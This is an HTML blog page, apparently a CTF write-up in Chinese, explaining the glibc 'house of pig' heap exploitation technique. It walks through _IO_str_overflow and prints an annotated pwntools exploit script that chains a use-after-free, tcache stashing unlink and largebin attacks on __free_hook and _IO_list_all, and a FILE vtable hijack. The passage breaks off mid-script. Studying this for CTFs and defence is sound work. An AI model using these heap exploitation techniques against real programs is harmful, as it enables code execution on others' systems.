@@ -1,0 +1,1088 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="CTFer" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="CTFer" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="CTFer" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="pwn" />
+
+
+<link rel="canonical" href="http://example.com/2023/04/16/house-of-pig/">
+
+
+
+  <title>
+house_of_pig |
+Arashimuのblog = CTFer</title>
+<meta name="generator" content="Hexo 6.1.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">house_of_pig
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2023-04-16 13:46:02">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-04-16T13:46:02+08:00">2023-04-16</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Arashimuのblog</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclgi503lj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giciundwu5j20zk0m8n9e.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicliwyw55j20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicitspjpbj20zk0m81ky.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicis3attqj20zk0m8k7l.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipetlbztpj20zk0m84qp.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/16/house-of-pig/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="岚沐">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="CTFer">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h2 id="io_file相关"><a class="markdownIt-Anchor" href="#io_file相关"></a> IO_FILE相关</h2>
+<p>目的：此时我们在tcache中布置好了<code>free_hook</code>相关的chunk，但如果题目不能利用malloc申请，只能利用calloc申请，那么我们是无法申请到tcache上的chunk的。</p>
+<p>现在来看看<code>IO_str_overflow</code>：</p>
+<pre class="highlight"><code class="c">_IO_str_overflow (FILE *fp, <span class="hljs-type">int</span> c)
+&#123;
+  <span class="hljs-type">int</span> flush_only = c == EOF;
+  <span class="hljs-type">size_t</span> pos;
+  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)
+      <span class="hljs-keyword">return</span> flush_only ? <span class="hljs-number">0</span> : EOF;
+  <span class="hljs-keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
+    &#123;
+      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;
+      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;
+      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;
+    &#125;
+  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
+  <span class="hljs-keyword">if</span> (pos &gt;= (<span class="hljs-type">size_t</span>) (_IO_blen (fp) + flush_only))
+    &#123;
+      <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="hljs-comment">/* not allowed to enlarge */</span>
+    <span class="hljs-keyword">return</span> EOF;
+      <span class="hljs-keyword">else</span>
+    &#123;
+      <span class="hljs-type">char</span> *new_buf;
+      <span class="hljs-type">char</span> *old_buf = fp-&gt;_IO_buf_base;
+      <span class="hljs-type">size_t</span> old_blen = _IO_blen (fp);
+      <span class="hljs-type">size_t</span> new_size = <span class="hljs-number">2</span> * old_blen + <span class="hljs-number">100</span>;
+      <span class="hljs-keyword">if</span> (new_size &lt; old_blen)
+        <span class="hljs-keyword">return</span> EOF;
+      new_buf = <span class="hljs-built_in">malloc</span> (new_size);
+      <span class="hljs-keyword">if</span> (new_buf == <span class="hljs-literal">NULL</span>)
+        &#123;
+          <span class="hljs-comment">/*      __ferror(fp) = 1; */</span>
+          <span class="hljs-keyword">return</span> EOF;
+        &#125;
+      <span class="hljs-keyword">if</span> (old_buf)
+        &#123;
+          <span class="hljs-built_in">memcpy</span> (new_buf, old_buf, old_blen);
+          <span class="hljs-built_in">free</span> (old_buf);
+          <span class="hljs-comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span>
+          fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;
+        &#125;
+      <span class="hljs-built_in">memset</span> (new_buf + old_blen, <span class="hljs-string">&#x27;\0&#x27;</span>, new_size - old_blen);
+ 
+      _IO_setb (fp, new_buf, new_buf + new_size, <span class="hljs-number">1</span>);
+      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);
+      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);
+      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);
+      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);
+ 
+      fp-&gt;_IO_write_base = new_buf;
+      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;
+    &#125;
+    &#125;
+ 
+  <span class="hljs-keyword">if</span> (!flush_only)
+    *fp-&gt;_IO_write_ptr++ = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) c;
+  <span class="hljs-keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)
+    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;
+  <span class="hljs-keyword">return</span> c;
+&#125;
+
+</code></pre>
+<p>上面有<code>malloc</code>、<code>memcpy</code>和<code>free</code>，所以考虑绕过里面的一些条件从而调用<code>malloc</code>，先看一下调用的部分</p>
+<pre class="highlight"><code class="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span>
+
+<span class="hljs-type">size_t</span> old_blen = _IO_blen (fp);
+
+<span class="hljs-type">size_t</span> new_size = <span class="hljs-number">2</span> * old_blen + <span class="hljs-number">100</span>;
+...
+new_buf = <span class="hljs-built_in">malloc</span> (new_size);
+...
+<span class="hljs-built_in">memcpy</span> (new_buf, old_buf, old_blen);
+<span class="hljs-built_in">free</span> (old_buf);
+</code></pre>
+<p>利用需要达到的条件</p>
+<pre class="highlight"><code class="c">fp-&gt;_flags=<span class="hljs-number">0</span>
+fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base&gt;=_IO_blen (fp)
+<span class="hljs-comment">// 可以令 fp-&gt;_IO_write_ptr=0xffffffffffff fp-&gt;_IO_write_base=1</span>
+</code></pre>
+<p>我们控制<code>_IO_buf_end</code>和<code>_IO_buf_base</code>就可以了</p>
+<h2 id="house-of-pig"><a class="markdownIt-Anchor" href="#house-of-pig"></a> house of pig</h2>
+<h3 id="题目分析"><a class="markdownIt-Anchor" href="#题目分析"></a> 题目分析</h3>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vemliYWk2NjYvYXJ0aWNsZS9kZXRhaWxzLzEyMDEyMTg5MQ==">各个结构体的分析可以参考这个博客</span></p>
+<p>show分析<br />
+<img data-src="/images/house_of_pigs/16.jpg" alt="" /><br />
+edit分析<br />
+<img data-src="/images/house_of_pigs/17.jpg" alt="" /><br />
+delete分析<br />
+<img data-src="/images/house_of_pigs/18.jpg" alt="" /><br />
+角色转换分析</p>
+<ul>
+<li>保存角色
+<ul>
+<li><img data-src="/images/house_of_pigs/19.jpg" alt="" /></li>
+</ul>
+</li>
+<li>恢复角色
+<ul>
+<li><img data-src="/images/house_of_pigs/20.jpg" alt="" /></li>
+</ul>
+</li>
+</ul>
+<p>先给出官方的wp，我追加了点注释</p>
+<pre class="highlight"><code class="python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
+context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]
+io = process(<span class="hljs-string">&#x27;./pig&#x27;</span>)
+<span class="hljs-comment"># io = remote(&#x27;182.92.203.154&#x27;, 35264)</span>
+elf = ELF(<span class="hljs-string">&#x27;./pig&#x27;</span>)
+<span class="hljs-comment">#libc = elf.libc</span>
+libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)
+
+rl = <span class="hljs-keyword">lambda</span>     a=<span class="hljs-literal">False</span>         : io.recvline(a)
+ru = <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-literal">True</span>    : io.recvuntil(a,b)
+rn = <span class="hljs-keyword">lambda</span> x                   : io.recvn(x)
+sn = <span class="hljs-keyword">lambda</span> x                   : io.send(x)
+sl = <span class="hljs-keyword">lambda</span> x                   : io.sendline(x)
+sa = <span class="hljs-keyword">lambda</span> a,b                 : io.sendafter(a,b)
+sla = <span class="hljs-keyword">lambda</span> a,b                : io.sendlineafter(a,b)
+irt = <span class="hljs-keyword">lambda</span>                    : io.interactive()
+dbg = <span class="hljs-keyword">lambda</span> text=<span class="hljs-literal">None</span>  : gdb.attach(io, text)
+<span class="hljs-comment"># lg = lambda s,addr            : log.info(&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27; % (s,addr))</span>
+lg = <span class="hljs-keyword">lambda</span> s                   : log.info(<span class="hljs-string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))
+uu32 = <span class="hljs-keyword">lambda</span> data              : u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
+uu64 = <span class="hljs-keyword">lambda</span> data              : u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
+
+<span class="hljs-comment">#text =&#x27;&#x27;&#x27;</span>
+<span class="hljs-comment">#&#x27;&#x27;&#x27;</span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">Find</span>():
+        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>, <span class="hljs-number">0xff</span>+<span class="hljs-number">1</span>):
+                <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>, <span class="hljs-number">0xff</span>+<span class="hljs-number">1</span>):
+                        <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>, <span class="hljs-number">0xff</span>+<span class="hljs-number">1</span>):
+                                <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>, <span class="hljs-number">0xff</span>+<span class="hljs-number">1</span>):
+                                        string1 = <span class="hljs-string">&#x27;A&#x27;</span> + <span class="hljs-built_in">chr</span>(x) + <span class="hljs-built_in">chr</span>(y) + <span class="hljs-built_in">chr</span>(z) + <span class="hljs-built_in">chr</span>(m)
+                                        out1 = hashlib.md5(string1).hexdigest()
+                                        <span class="hljs-comment"># if out1[4:6] == &#x27;00&#x27;:</span>
+                                        <span class="hljs-comment">#       print out1</span>
+                                        <span class="hljs-keyword">if</span> out1.startswith(<span class="hljs-string">&#x27;3c4400&#x27;</span>):
+                                                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[&#x27;</span> + string1.encode(<span class="hljs-string">&#x27;hex&#x27;</span>) + <span class="hljs-string">&#x27;]&#x27;</span>)
+                                                <span class="hljs-built_in">print</span>(out1)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">Menu</span>(<span class="hljs-params">cmd</span>):
+        sla(<span class="hljs-string">&#x27;Choice: &#x27;</span>, <span class="hljs-built_in">str</span>(cmd))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">Add</span>(<span class="hljs-params">size, content</span>):
+        Menu(<span class="hljs-number">1</span>)
+        sla(<span class="hljs-string">&#x27;size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))
+        sla(<span class="hljs-string">&#x27;message: &#x27;</span>, content)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">Show</span>(<span class="hljs-params">idx</span>):
+        Menu(<span class="hljs-number">2</span>)
+        sla(<span class="hljs-string">&#x27;index: &#x27;</span>, <span class="hljs-built_in">str</span>(idx))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">Edit</span>(<span class="hljs-params">idx, content</span>):
+        Menu(<span class="hljs-number">3</span>)
+        sla(<span class="hljs-string">&#x27;index: &#x27;</span>, <span class="hljs-built_in">str</span>(idx))
+        sa(<span class="hljs-string">&#x27;message: &#x27;</span>, content)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">Del</span>(<span class="hljs-params">idx</span>):
+        Menu(<span class="hljs-number">4</span>)
+        sla(<span class="hljs-string">&#x27;index: &#x27;</span>, <span class="hljs-built_in">str</span>(idx))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">Change</span>(<span class="hljs-params">user</span>):
+        Menu(<span class="hljs-number">5</span>)
+        <span class="hljs-keyword">if</span> user == <span class="hljs-number">1</span>:
+                sla(<span class="hljs-string">&#x27;user:\n&#x27;</span>, <span class="hljs-string">&#x27;A\x01\x95\xc9\x1c&#x27;</span>)
+        <span class="hljs-keyword">elif</span> user == <span class="hljs-number">2</span>:
+                sla(<span class="hljs-string">&#x27;user:\n&#x27;</span>, <span class="hljs-string">&#x27;B\x01\x87\xc3\x19&#x27;</span>)
+        <span class="hljs-keyword">elif</span> user == <span class="hljs-number">3</span>:
+                sla(<span class="hljs-string">&#x27;user:\n&#x27;</span>, <span class="hljs-string">&#x27;C\x01\xf7\x3c\x32&#x27;</span>)
+
+
+<span class="hljs-comment"># Find()</span>
+<span class="hljs-comment"># A: &#x27;A\x01\x95\xc9\x1c&#x27;</span>
+<span class="hljs-comment"># B: &#x27;B\x01\x87\xc3\x19&#x27;</span>
+<span class="hljs-comment"># C: &#x27;C\x01\xf7\x3c\x32&#x27;</span>
+
+
+<span class="hljs-comment"># change两次可以造成UAF的漏洞</span>
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():
+    gdb.attach(io)
+    pause()
+
+<span class="hljs-comment">#----- prepare tcache_stashing_unlink_attack</span>
+Change(<span class="hljs-number">2</span>)
+<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):
+        Add(<span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;B&#x27;</span>*<span class="hljs-number">0x28</span>) <span class="hljs-comment"># B0~B4</span>
+        Del(x)  <span class="hljs-comment"># B0~B4，在tcache:0xa0的地方填充5个chunk</span>
+Change(<span class="hljs-number">1</span>)
+Add(<span class="hljs-number">0x150</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x68</span>) <span class="hljs-comment"># A0</span>
+<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
+        Add(<span class="hljs-number">0x150</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x68</span>) <span class="hljs-comment"># A1~A7</span>
+        Del(<span class="hljs-number">1</span>+x)    <span class="hljs-comment">#在tcache:0x160的地方填充7个chunk</span>
+Del(<span class="hljs-number">0</span>)              <span class="hljs-comment">#A0会被释放到unsorted bin</span>
+<span class="hljs-comment">#debug()</span>
+Change(<span class="hljs-number">2</span>)           <span class="hljs-comment">#</span>
+Add(<span class="hljs-number">0xb0</span>, <span class="hljs-string">&#x27;B&#x27;</span>*<span class="hljs-number">0x28</span>) <span class="hljs-comment"># B5 split 0x160 to 0xc0 and 0xa0 分割在unsorted bin中的A0为0xa0(后面A0进small bin中，为tcache_stashing_unlink_attack作准备)</span>
+
+Change(<span class="hljs-number">1</span>)            <span class="hljs-comment">#会修改flag标志为0，可以绕过检查，造成UAF漏洞</span>
+Add(<span class="hljs-number">0x180</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x78</span>) <span class="hljs-comment"># A8 会让unsorted bin中0xa0大小的chunk进入small bins中</span>
+<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
+        Add(<span class="hljs-number">0x180</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x78</span>) <span class="hljs-comment"># A9~A15</span>
+        Del(<span class="hljs-number">9</span>+x)    <span class="hljs-comment">#填满tcache:0x190</span>
+Del(<span class="hljs-number">8</span>)              <span class="hljs-comment">#A8进入unsorted bin</span>
+
+Change(<span class="hljs-number">2</span>)           
+Add(<span class="hljs-number">0xe0</span>, <span class="hljs-string">&#x27;B&#x27;</span>*<span class="hljs-number">0x38</span>) <span class="hljs-comment"># B6 split 0x190 to 0xf0 and 0xa0 再次划分A8，因为small bin中至少要两个才可以触发tcache_stashing_unlink_attack</span>
+
+<span class="hljs-comment">#----- leak libc_base and heap_base</span>
+<span class="hljs-comment">#debug()</span>
+Change(<span class="hljs-number">1</span>)
+Add(<span class="hljs-number">0x430</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x158</span>) <span class="hljs-comment"># A16，此时A8+0xf0(0xa0)从unsorted bin进入small bin</span>
+
+Change(<span class="hljs-number">2</span>)
+Add(<span class="hljs-number">0xf0</span>, <span class="hljs-string">&#x27;B&#x27;</span>*<span class="hljs-number">0x48</span>) <span class="hljs-comment"># B7</span>
+
+Change(<span class="hljs-number">1</span>)
+Del(<span class="hljs-number">16</span>)             <span class="hljs-comment">#A16进入unsorted bin</span>
+
+Change(<span class="hljs-number">2</span>)
+Add(<span class="hljs-number">0x440</span>, <span class="hljs-string">&#x27;B&#x27;</span>*<span class="hljs-number">0x158</span>) <span class="hljs-comment"># B8 ，导致A16从unsorted bin进入large bin</span>
+
+<span class="hljs-string">&#x27;&#x27;&#x27;
+tcahce 
+0xa0:  B4-&gt;B3-&gt;B2-&gt;B1-&gt;B0
+0x160: A7-&gt;A6-&gt;A5-&gt;A4-&gt;A3-&gt;A2-&gt;A1
+0x190: A15-&gt;A14-&gt;A13-&gt;A12-&gt;A11-&gt;A10-&gt;A9
+small bin:
+0xa0: (A8+0xf0)-&gt;A0
+
+large bin:
+0x440-0x470: A16(0x440)
+
+
+
+A16:
+fd=bk=main_arena+xxxx
+fd_nextsize=bk_nextsize=addr(A16)
+&#x27;&#x27;&#x27;</span>
+
+
+Change(<span class="hljs-number">1</span>)
+Show(<span class="hljs-number">16</span>)
+ru(<span class="hljs-string">&#x27;message is: &#x27;</span>)
+libc_base = uu64(rl()) - <span class="hljs-number">0x1ebfe0</span>
+lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)
+
+Edit(<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0xf</span>+<span class="hljs-string">b&#x27;\n&#x27;</span>)
+Show(<span class="hljs-number">16</span>)
+ru(<span class="hljs-string">&#x27;message is: &#x27;</span>+<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0xf</span>+<span class="hljs-string">&#x27;\n&#x27;</span>)  <span class="hljs-comment">#为了方便泄露，把libc的地址覆盖为A</span>
+heap_base = uu64(rl()) - <span class="hljs-number">0x13940</span>
+lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)
+
+
+<span class="hljs-comment">#----- first largebin_attack</span>
+Edit(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>*p64(libc_base+<span class="hljs-number">0x1ebfe0</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-comment"># recover</span>
+
+Add(<span class="hljs-number">0x430</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x158</span>) <span class="hljs-comment"># A17=A16   </span>
+
+Add(<span class="hljs-number">0x430</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x158</span>) <span class="hljs-comment"># A18</span>
+Add(<span class="hljs-number">0x430</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x158</span>) <span class="hljs-comment"># A19</span>
+
+Change(<span class="hljs-number">2</span>)
+Del(<span class="hljs-number">8</span>)                <span class="hljs-comment">#B8(0x450)进入unsorted bin</span>
+
+Add(<span class="hljs-number">0x450</span>, <span class="hljs-string">&#x27;B&#x27;</span>*<span class="hljs-number">0x168</span>) <span class="hljs-comment"># B9，会导致B8进入largen bin</span>
+
+Change(<span class="hljs-number">1</span>)             
+Del(<span class="hljs-number">17</span>)               <span class="hljs-comment"># A17进入unsorted bin  </span>
+
+Change(<span class="hljs-number">2</span>)
+free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]
+Edit(<span class="hljs-number">8</span>, p64(<span class="hljs-number">0</span>) + p64(free_hook-<span class="hljs-number">0x28</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-comment">#利用UAF，角色2修改B8的bk_nextsize为free_hook-0x28</span>
+
+Change(<span class="hljs-number">3</span>)
+Add(<span class="hljs-number">0xa0</span>, <span class="hljs-string">&#x27;C&#x27;</span>*<span class="hljs-number">0x28</span>) <span class="hljs-comment"># C0 triger largebin_attack, write a heap addr to __free_hook-8</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;
+large bin:
+0x440-0x470: B8
+
+
+free_hook-0x28:
+fd=bk=0
+fd_nextsize=B8
+addr(bk_nextsize=0)=free_hook
+&#x27;&#x27;&#x27;</span>
+
+Change(<span class="hljs-number">2</span>)
+Edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>*p64(heap_base+<span class="hljs-number">0x13e80</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-comment"># recover 恢复B8的fd_nextsize=bk_nextsize=addr(B8)</span>
+
+<span class="hljs-comment">#----- second largebin_attack</span>
+Change(<span class="hljs-number">3</span>)
+Add(<span class="hljs-number">0x380</span>, <span class="hljs-string">&#x27;C&#x27;</span>*<span class="hljs-number">0x118</span>) <span class="hljs-comment"># C1=A17+0xb0</span>
+
+Change(<span class="hljs-number">1</span>)
+Del(<span class="hljs-number">19</span>)               <span class="hljs-comment"># A19进入unsorted bin</span>
+
+Change(<span class="hljs-number">2</span>)
+IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]
+Edit(<span class="hljs-number">8</span>, p64(<span class="hljs-number">0</span>) + p64(IO_list_all-<span class="hljs-number">0x20</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)
+
+Change(<span class="hljs-number">3</span>)
+Add(<span class="hljs-number">0xa0</span>, <span class="hljs-string">&#x27;C&#x27;</span>*<span class="hljs-number">0x28</span>) <span class="hljs-comment"># C2 triger largebin_attack, write a heap addr to _IO_list_all</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;
+IO_list_all-0x20:
+fd=0
+bk=0
+IO_list_all:fd_nextsize=B8
+bk_nextsize=0
+
+&#x27;&#x27;&#x27;</span>
+Change(<span class="hljs-number">2</span>)
+Edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>*p64(heap_base+<span class="hljs-number">0x13e80</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-comment"># recover</span>
+
+<span class="hljs-comment">#----- tcache_stashing_unlink_attack and FILE attack</span>
+Change(<span class="hljs-number">1</span>)
+payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x50</span> + p64(heap_base+<span class="hljs-number">0x12280</span>) + p64(free_hook-<span class="hljs-number">0x20</span>)
+<span class="hljs-comment">#A0=heap+0x12280</span>
+<span class="hljs-comment"># A0=heap_base+0x12280</span>
+Edit(<span class="hljs-number">8</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)
+<span class="hljs-string">&#x27;&#x27;&#x27;
+smallbin 0xa0:(A8+0xf0)-&gt;A0
+
+修改后
+由于修改的是A8:
+A8:
+&#x27;A&#x27;*0x10
+...
+...
+&#x27;A&#x27;*0x10
+...
+...
+&#x27;A&#x27;*0x10
+...
+...
+&#x27;A&#x27;*0x10
+...
+...
+&#x27;A&#x27;*0x10
+...
+A8+0xf0
+A0   free_hook-0x20
+&#x27;&#x27;&#x27;</span>
+
+<span class="hljs-comment"># =&gt;small bin: </span>
+<span class="hljs-comment">#    bk: (A8+0xf0)-&gt;A0-&gt;free_hook-0x20-&gt;xx</span>
+Change(<span class="hljs-number">3</span>)
+payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span> + p64(heap_base+<span class="hljs-number">0x147c0</span>)
+payload = payload.ljust(<span class="hljs-number">0x158</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)
+Add(<span class="hljs-number">0x440</span>, payload) <span class="hljs-comment"># C3 change fake FILE _chain，申请出B8</span>
+Add(<span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;C&#x27;</span>*<span class="hljs-number">0x28</span>) <span class="hljs-comment"># C4 triger tcache_stashing_unlink_attack, put the chunk of __free_hook into tcache</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;
+(A8+0xf0)被申请到了C4
+tcache:
+0xa0: (free_hook-0x10)-&gt;A0-&gt;B4-&gt;B3-&gt;B2-&gt;B1-&gt;B0
+&#x27;&#x27;&#x27;</span>
+IO_str_vtable = libc_base + <span class="hljs-number">0x1ED560</span>  
+<span class="hljs-comment">#_IO_jump_t exit触发_IO_file_overflow，而_IO_file_overflow根据IO的虚表选择对应的函数,要劫持虚表为_IO_str_jumps，调用_IO_str_overflow</span>
+<span class="hljs-comment">#_IO_str_overflow会调用malloc、memcpy、free</span>
+<span class="hljs-comment">#由于题目只能calloc，而我们的free_hook-0x10再tcache上，需要用malloc申请出来</span>
+<span class="hljs-comment">#利用memcpy将system函数写到free_hook上</span>
+<span class="hljs-comment">#最后利用free释放掉一个/bin/sh\x00</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;
+#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)
+
+size_t old_blen = _IO_blen (fp);
